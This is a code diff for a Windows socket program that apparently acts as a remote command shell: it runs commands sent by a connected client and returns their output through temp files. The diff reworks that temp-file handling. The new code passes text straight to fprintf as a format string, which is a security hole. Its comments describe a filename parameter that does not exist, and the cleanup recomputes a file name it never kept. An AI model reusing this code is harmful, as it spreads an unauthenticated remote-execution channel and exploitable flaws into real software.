@@ -2,6 +2,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <fileapi.h>
 
 #include <winsock2.h>
 #include <windows.h>
@@ -19,9 +20,8 @@ Return values:
     1 - continue the connection
 */
 int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE){
-    
     char buf[BUF_SIZE];     // space for reply from client
-    FILE *reply;           // space for message to client
+    FILE *reply;            // space for message to client
 
     // default working directory
     char * cwd;
@@ -76,6 +76,16 @@ int comm(SOCKET sock, int BUF_SIZE, int REPLY_MAX_SIZE){
             }
             fclose(reply);
 
+            // remove the reply file if it is temp file in memory
+            char path[64];
+            char filename[260];
+            GetTempPathA(sizeof(path), path);
+            GetTempFileNameA(path, "buf", 1, filename);
+
+            if (GetFileAttributesA(filename) != INVALID_FILE_ATTRIBUTES){ // the file exists, so remove it
+                remove(filename);
+            }
+
         }
         else{  // close was sent
             printf("Connection was closed by client.");
@@ -117,15 +127,15 @@ FILE* processExtCmd(char * cmd, char * cwd){
         strcpy(cwd, temp);
         free(temp);
 
-        return createTmpFile(cwd);
+        return getTempFile(cwd);
     }
     else if (strcmp(strtok(cmdCpy, " "), "transfer") == 0) {
         char * filename = cmd;
         filename += (strcspn(cmd, " ")+1); // get the entire second argument whether or not it includes spaces
-        return createTmpFile("The transfer command has not been implemented yet.");
+        return getTempFile("The transfer command has not been implemented yet.");
     }
     else{
-        return createTmpFile("That command is not recognized!\n");
+        return getTempFile("That command is not recognized!\n");
     }
 }
 
@@ -159,11 +169,11 @@ FILE* processShellCmd(char * cmd, char * cwd) {
             sprintf(temp, "%s\\%s", cwd, dirptr);
             strcpy(cwd, temp);
         }
-        return createTmpFile(cwd);
+        return getTempFile(cwd);
     }
     else if (*(cmd+1) == ':' && arg == NULL && strlen(cmd) == 2) {  // it's change drive command (D: for example)
         strcpy(cwd, cmd);
-        return createTmpFile(cwd);
+        return getTempFile(cwd);
     }
     else {  // it is a normal command
         char finalCmd[512];
@@ -209,15 +219,25 @@ char* getCmdOutStr(char * cmd, int REPLY_MAX_SIZE){
 
 /*
 Returns a pointer to a temp file created with the given text written into it
+The name/path of the file is placed into the filename parameter
+The name/path of the file is preserved solely so it can be deleted later
 */
-FILE* createTmpFile(char * txt){
-    FILE *fp;
-    fp = tmpfile();
-    if (fp == NULL){
-        return NULL;
-    }
+FILE* getTempFile(char * string){
+   FILE* file;
+   char path[64];
+   char filename[260];
+   
+   GetTempPathA(sizeof(path), path);
+   int result = GetTempFileNameA(path, "buf", 1, filename);
+   if (result == 0){
+      return NULL;
+   }
+   file = fopen(filename, "w+b");
 
-    fprintf(fp, txt);
-    fseek(fp, 0, SEEK_SET);
-    return fp;
+   fprintf(file, string);
+
+   // seek back to the beginning of the file
+   fseek(file, 0, SEEK_SET);
+
+   return file;
 }
